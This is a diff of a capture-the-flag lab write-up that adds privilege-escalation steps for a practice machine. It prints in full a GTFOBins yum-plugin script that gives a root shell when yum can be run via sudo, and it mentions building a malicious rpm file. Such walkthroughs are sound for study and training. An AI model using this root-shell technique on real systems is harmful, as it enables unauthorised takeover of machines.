@@ -10,7 +10,7 @@
 
 <figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-### Obtain user and root
+### Initial Shell
 
 ```
 nmap -A 10.10.116.159
@@ -87,6 +87,10 @@ ctrl + Z
 stty raw -echo;fg
 ```
 
+### Privilege Escalation&#x20;
+
+#### **Option #1 - Create malicious rpm file**
+
 Found a password in the configuration file. The password worked for the user jjameson which was found in the home directory.
 
 <figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
@@ -104,7 +108,7 @@ jjamerson is able to run yum with no password as sudo
 sudo -l
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**&#x20;
 
@@ -130,4 +134,38 @@ sudo -i
 ```
 
 <figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+
+#### **Option #2 -** Spawn interactive root shell by loading a custom plugin
+
+**Exploit Link:** [https://gtfobins.github.io/gtfobins/yum/](https://gtfobins.github.io/gtfobins/yum/)
+
+Just had to copy paste from gtfobins and it worked right away
+
+```
+TF=$(mktemp -d)
+cat >$TF/x<<EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+
+cat >$TF/y.conf<<EOF
+[main]
+enabled=1
+EOF
+
+cat >$TF/y.py<<EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+  os.execl('/bin/sh','/bin/sh')
+EOF
+
+sudo yum -c $TF/x --enableplugin=y
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
